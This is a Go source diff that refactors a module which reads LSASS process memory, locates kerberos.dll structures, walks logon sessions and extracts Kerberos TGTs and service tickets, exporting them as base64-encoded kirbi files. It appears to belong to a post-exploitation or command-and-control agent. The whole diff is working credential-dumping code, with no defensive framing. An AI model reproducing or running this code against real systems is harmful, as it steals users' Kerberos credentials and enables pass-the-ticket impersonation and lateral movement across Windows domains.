@@ -100,7 +100,6 @@ func executeKerbTicketsInner() structs.CommandResult {
 	if err != nil {
 		return errorf("Kerberos tickets: find kerberos.dll in lsass: %v", err)
 	}
-
 	kerbBytes, err := lsassReadModuleBytes(h, kerbMod)
 	if err != nil {
 		return errorf("Kerberos tickets: read kerberos.dll (base=0x%X size=%d): %v",
@@ -113,10 +112,44 @@ func executeKerbTicketsInner() structs.CommandResult {
 	}
 
 	reader := lsassRemoteReader{h: h}
-	sessLayout, tickLayout := selectKerbLayouts(0) // default to modern layout
+	sessLayout, tickLayout := selectKerbLayouts(0)
 
-	// Probe the first session found in any hash table slot to auto-detect
-	// the correct struct layout.
+	sessLayout = kerbProbeSessionLayout(reader, tableAddr, sessLayout)
+	sessions, err := walkKerbSessionList(reader, tableAddr, sessLayout)
+	if err != nil && len(sessions) == 0 {
+		return errorf("Kerberos tickets: walk session list: %v", err)
+	}
+
+	tickLayout, ticketProbeMsg, ticketDiagOutput := kerbProbeTicketLayout(reader, sessions, sessLayout, tickLayout)
+	diagOutput := kerbDiagScanSessions(sessions, sessLayout)
+
+	sessionReports, outputLines, stats := kerbExtractAllTickets(reader, sessions, sessLayout, tickLayout)
+
+	summary := kerbTicketSummary{
+		LsassPID: pid, KerbDllBase: fmt.Sprintf("0x%X", kerbMod.Base),
+		KerbDllSize: kerbMod.Size, TableAddr: fmt.Sprintf("0x%X", tableAddr),
+		SigVariant: sigVariant, SessionLayout: sessLayout.Name,
+		TicketLayout: tickLayout.Name, SessionsFound: len(sessions),
+		TotalTickets: stats.total, TGTs: stats.tgts,
+		ServiceTickets: stats.service, KirbiExported: stats.kirbi,
+	}
+
+	report := kerbTicketReport{Sessions: sessionReports, Summary: summary}
+	jsonBytes, err := json.MarshalIndent(report, "", "  ")
+	if err != nil {
+		return errorf("Kerberos tickets: marshal report: %v", err)
+	}
+
+	header := kerbFormatHeader(summary, kerbMod, sessions, ticketProbeMsg, outputLines)
+
+	if stats.total > 0 && stats.kirbi == 0 && ticketDiagOutput != "" {
+		diagOutput += "\n" + ticketDiagOutput
+	}
+
+	return successResult(header + diagOutput + "\n" + string(jsonBytes))
+}
+
+func kerbProbeSessionLayout(reader lsassRemoteReader, tableAddr uintptr, sessLayout kerbSessionLayout) kerbSessionLayout {
 	probeSlots := detectHashTableSize(reader, tableAddr)
 	for slot := 0; slot < probeSlots; slot++ {
 		slotAddr := tableAddr + uintptr(slot*16)
@@ -125,26 +158,16 @@ func executeKerbTicketsInner() structs.CommandResult {
 			continue
 		}
 		probeBase := head.Flink - uintptr(sessLayout.ListEntryOff)
-		sessLayout = probeKerbSessionLayout(reader, probeBase, sessLayout)
-		break
+		return probeKerbSessionLayout(reader, probeBase, sessLayout)
 	}
+	return sessLayout
+}
 
-	sessions, err := walkKerbSessionList(reader, tableAddr, sessLayout)
-	if err != nil && len(sessions) == 0 {
-		return errorf("Kerberos tickets: walk session list: %v", err)
-	}
-
-	var diagOutput string
-
-	// Probe the ticket struct layout using the first ticket found.
-	var ticketProbeMsg string
-	var ticketDiagOutput string
-	ticketProbed := false
+func kerbProbeTicketLayout(reader lsassRemoteReader, sessions []kerbSession, sessLayout kerbSessionLayout, tickLayout kerbTicketLayout) (kerbTicketLayout, string, string) {
 	for _, sess := range sessions {
-		for _, tl := range []struct {
-			off int
-			idx int
-		}{{sessLayout.Tickets1Off, 1}, {sessLayout.Tickets2Off, 2}, {sessLayout.Tickets3Off, 3}} {
+		for _, tl := range []struct{ off, idx int }{
+			{sessLayout.Tickets1Off, 1}, {sessLayout.Tickets2Off, 2}, {sessLayout.Tickets3Off, 3},
+		} {
 			if tl.off+16 > len(sess.Raw) {
 				continue
 			}
@@ -153,28 +176,20 @@ func executeKerbTicketsInner() structs.CommandResult {
 			if headErr2 != nil || head2.Flink == 0 || head2.Flink == listHeadAddr {
 				continue
 			}
-			// Read an extended buffer from the first ticket for probing
 			probeBuf, pErr := reader.Read(head2.Flink, 0x200)
 			if pErr != nil || len(probeBuf) < 0x100 {
 				continue
 			}
-			tickLayout, ticketProbeMsg = probeKerbTicketLayout(reader, head2.Flink, tickLayout)
-			ticketDiagOutput = ticketDiagHexDump(probeBuf, head2.Flink, tickLayout)
-			ticketProbed = true
-			break
-		}
-		if ticketProbed {
-			break
+			tl2, msg := probeKerbTicketLayout(reader, head2.Flink, tickLayout)
+			return tl2, msg, ticketDiagHexDump(probeBuf, head2.Flink, tl2)
 		}
 	}
+	return tickLayout, "", ""
+}
 
-	// Diagnostic: scan all sessions for LIST_ENTRY patterns. Report all
-	// self-referencing (empty) and populated entries. For sessions with
-	// valid usernames, scan the full buffer.
+func kerbDiagScanSessions(sessions []kerbSession, sessLayout kerbSessionLayout) string {
+	var diagOutput string
 	for _, sess := range sessions {
-		if sess.UserName == "" && sess.LUID != 0 {
-			continue
-		}
 		if sess.UserName == "" {
 			continue
 		}
@@ -194,12 +209,10 @@ func executeKerbTicketsInner() structs.CommandResult {
 		break
 	}
 
-	// For the first session with tickets, dump the first ticket entry
 	for _, sess := range sessions {
 		if len(sess.Tickets) == 0 {
 			continue
 		}
-		// Walk ticket lists and dump the first non-empty one
 		for _, tl := range []struct{ off, idx int }{
 			{sessLayout.Tickets1Off, 1}, {sessLayout.Tickets2Off, 2}, {sessLayout.Tickets3Off, 3},
 		} {
@@ -217,49 +230,45 @@ func executeKerbTicketsInner() structs.CommandResult {
 		}
 		break
 	}
+	return diagOutput
+}
 
-	var totalTickets, tgts, serviceTickets, kirbiExported int
+type kerbTicketStats struct {
+	total, tgts, service, kirbi int
+}
+
+func kerbExtractAllTickets(reader lsassRemoteReader, sessions []kerbSession, sessLayout kerbSessionLayout, tickLayout kerbTicketLayout) ([]kerbSessionReport, []string, kerbTicketStats) {
+	var stats kerbTicketStats
 	sessionReports := make([]kerbSessionReport, 0, len(sessions))
 	var outputLines []string
 
 	for i := range sessions {
 		sess := &sessions[i]
-
-		// Extract tickets from all three lists
 		sess.Tickets = extractKerbTickets(reader, sess.Raw, sess.Address, sessLayout, tickLayout)
-
 		if len(sess.Tickets) == 0 {
 			continue
 		}
 
 		sessRpt := kerbSessionReport{
-			LUID:     fmt.Sprintf("0x%016X", sess.LUID),
-			UserName: sess.UserName,
-			Domain:   sess.Domain,
+			LUID: fmt.Sprintf("0x%016X", sess.LUID), UserName: sess.UserName, Domain: sess.Domain,
 		}
 
 		for _, t := range sess.Tickets {
-			totalTickets++
+			stats.total++
 			listName := "service"
 			if t.ListIndex == 1 {
 				listName = "TGT"
-				tgts++
+				stats.tgts++
 			} else {
-				serviceTickets++
+				stats.service++
 			}
 
 			entry := kerbTicketEntryRpt{
-				ListIndex:   t.ListIndex,
-				ListName:    listName,
-				ServiceName: t.ServiceName,
-				ClientName:  t.ClientName,
-				Domain:      t.DomainName,
-				Flags:       formatTicketFlags(t.TicketFlags),
-				KeyType:     t.KeyType,
-				EncType:     t.TicketEncType,
-				TicketSize:  len(t.TicketBytes),
+				ListIndex: t.ListIndex, ListName: listName, ServiceName: t.ServiceName,
+				ClientName: t.ClientName, Domain: t.DomainName,
+				Flags: formatTicketFlags(t.TicketFlags), KeyType: t.KeyType,
+				EncType: t.TicketEncType, TicketSize: len(t.TicketBytes),
 			}
-
 			if !t.StartTime.IsZero() {
 				entry.StartTime = t.StartTime.Format(time.RFC3339)
 			}
@@ -269,82 +278,46 @@ func executeKerbTicketsInner() structs.CommandResult {
 			if !t.RenewUntil.IsZero() {
 				entry.RenewUntil = t.RenewUntil.Format(time.RFC3339)
 			}
-
 			if len(t.TicketBytes) > 0 {
 				kirbi, kErr := buildKirbi(t)
 				if kErr == nil && len(kirbi) > 0 {
 					entry.KirbiB64 = base64.StdEncoding.EncodeToString(kirbi)
-					kirbiExported++
+					stats.kirbi++
 				}
 			}
-
 			sessRpt.Tickets = append(sessRpt.Tickets, entry)
 
-			// Build human-readable output line
-			line := fmt.Sprintf("[%s] %s\\%s → %s (%s)",
-				listName, sess.Domain, sess.UserName, t.ServiceName, t.DomainName)
+			line := fmt.Sprintf("[%s] %s\\%s → %s (%s)", listName, sess.Domain, sess.UserName, t.ServiceName, t.DomainName)
 			if !t.EndTime.IsZero() {
 				line += fmt.Sprintf(" expires %s", t.EndTime.Format("2006-01-02 15:04"))
 			}
 			outputLines = append(outputLines, line)
 		}
-
 		sessionReports = append(sessionReports, sessRpt)
 	}
+	return sessionReports, outputLines, stats
+}
 
-	summary := kerbTicketSummary{
-		LsassPID:       pid,
-		KerbDllBase:    fmt.Sprintf("0x%X", kerbMod.Base),
-		KerbDllSize:    kerbMod.Size,
-		TableAddr:      fmt.Sprintf("0x%X", tableAddr),
-		SigVariant:     sigVariant,
-		SessionLayout:  sessLayout.Name,
-		TicketLayout:   tickLayout.Name,
-		SessionsFound:  len(sessions),
-		TotalTickets:   totalTickets,
-		TGTs:           tgts,
-		ServiceTickets: serviceTickets,
-		KirbiExported:  kirbiExported,
-	}
-
-	report := kerbTicketReport{
-		Sessions: sessionReports,
-		Summary:  summary,
-	}
-
-	jsonBytes, err := json.MarshalIndent(report, "", "  ")
-	if err != nil {
-		return errorf("Kerberos tickets: marshal report: %v", err)
-	}
-
+func kerbFormatHeader(summary kerbTicketSummary, kerbMod lsassRemoteModule, sessions []kerbSession, ticketProbeMsg string, outputLines []string) string {
 	var header strings.Builder
-	header.WriteString(fmt.Sprintf("=== Kerberos Ticket Extraction ===\n"))
+	header.WriteString("=== Kerberos Ticket Extraction ===\n")
 	header.WriteString(fmt.Sprintf("LSASS PID: %d | kerberos.dll: %s (size %d)\n",
-		pid, summary.KerbDllBase, kerbMod.Size))
-	header.WriteString(fmt.Sprintf("Signature: %s | Table: %s\n", sigVariant, summary.TableAddr))
+		summary.LsassPID, summary.KerbDllBase, kerbMod.Size))
+	header.WriteString(fmt.Sprintf("Signature: %s | Table: %s\n", summary.SigVariant, summary.TableAddr))
 	header.WriteString(fmt.Sprintf("Sessions: %d | Tickets: %d (TGTs: %d, Service: %d) | Kirbi: %d\n",
-		len(sessions), totalTickets, tgts, serviceTickets, kirbiExported))
+		summary.SessionsFound, summary.TotalTickets, summary.TGTs, summary.ServiceTickets, summary.KirbiExported))
 	if ticketProbeMsg != "" {
 		header.WriteString(fmt.Sprintf("Ticket probe: %s\n", ticketProbeMsg))
 	}
 	header.WriteString("\nAll sessions:\n")
 	for i := range sessions {
 		s := &sessions[i]
-		tktCount := len(s.Tickets)
 		header.WriteString(fmt.Sprintf("  [%d] LUID=0x%X user=%q domain=%q tickets=%d\n",
-			i, s.LUID, s.UserName, s.Domain, tktCount))
+			i, s.LUID, s.UserName, s.Domain, len(s.Tickets)))
 	}
 	header.WriteString("\n")
-
 	for _, line := range outputLines {
 		header.WriteString(line + "\n")
 	}
-
-	// If tickets were found but have empty service names, include a hex dump
-	// of the first ticket for debugging struct offsets.
-	if totalTickets > 0 && kirbiExported == 0 && ticketDiagOutput != "" {
-		diagOutput += "\n" + ticketDiagOutput
-	}
-
-	return successResult(header.String() + diagOutput + "\n" + string(jsonBytes))
+	return header.String()
 }
